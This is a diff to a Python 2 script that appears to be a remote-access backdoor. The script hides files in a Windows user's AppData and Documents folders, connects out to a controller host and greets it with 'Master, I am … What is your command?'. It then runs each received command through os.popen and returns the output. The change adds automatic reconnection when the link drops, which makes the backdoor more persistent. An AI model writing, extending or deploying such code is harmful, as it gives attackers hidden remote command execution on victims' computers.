@@ -40,7 +40,7 @@ def storagepath(system):
             file = open("C:\users\%s\AppData\Local\Temp\.file.txt" % user, 'w')
         except Exception as e:
             print "failed 30"
-            # I Don't really know where to go here
+            # I Don't really know where to go here for now
         try:
             file = open("C:\Users\%s\Documents\.systemConf.txt" % user, 'w')
         except Exception as e:
@@ -63,14 +63,16 @@ def call(system, home):
     print ("%s" % log)
     try:
         connectionType.connect((home, port))
-        command_handle(connectionType, system, log)
+        command_handle(connectionType, system, log, home)
     except Exception as e:
         print ("Connection lost  %s" % e)
         log.write("%s" % e)
+        call(system, home)
+
 ################################
 
 
-def command_handle(connectionType, system, log):
+def command_handle(connectionType, system, log, home):
     try:
         command = ""
         connectionType.send("Master, I am %s What is your command?" % system)
@@ -84,6 +86,7 @@ def command_handle(connectionType, system, log):
             connectionType.send(os.popen(("%s" % command)).read())
     except Exception as e:
         log.write("$s" % e)
+
 
 
 def main():
